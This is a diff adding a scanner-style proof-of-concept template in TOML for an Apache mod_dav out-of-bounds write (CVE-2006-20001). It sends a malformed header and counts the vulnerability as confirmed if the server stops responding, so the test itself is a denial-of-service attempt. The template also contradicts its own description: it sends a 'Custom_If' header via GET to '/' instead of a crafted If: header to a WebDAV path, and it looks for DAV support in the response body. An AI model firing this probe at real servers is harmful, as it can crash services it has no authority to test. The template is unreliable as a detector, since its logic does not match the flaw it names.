@@ -1,0 +1,49 @@
+[info]
+id = "POC-AVE-2006-0005"
+name = "Apache HTTP Server mod_dav If:头越界读写拒绝服务检测 PoC"
+author = "AVE"
+severity = "high"
+tags = ["cve-2006-20001", "apache", "httpd", "mod_dav", "dos", "denial-of-service", "cwe-787"]
+description = "Apache HTTP Server 2.4.0至2.4.54版本mod_dav模块存在越界读写漏洞(CVE-2006-20001)。攻击者通过发送包含特制If:请求头的HTTP请求，可导致堆内存越界读取或写入单个零字节，造成子进程崩溃。该PoC通过向目标WebDAV路径发送包含畸形If:头的请求，并检测服务器是否因此不可用来判断漏洞是否存在。"
+vuln_id = ["CVE-2006-20001", "AVE-2006-0005"]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200, 302, 301, 403, 404]
+expect = true
+
+[[poc.requests]]
+method = "OPTIONS"
+path = "/"
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["DAV", "DAV/"]
+expect = true
+
+[[poc.requests]]
+method = "GET"
+path = "/"
+headers.Custom_If = "<"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200, 302, 301, 403, 404, 500, 502, 503]
+expect = true
+
+[[poc.requests]]
+method = "GET"
+path = "/"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200, 302, 301]
+expect = false
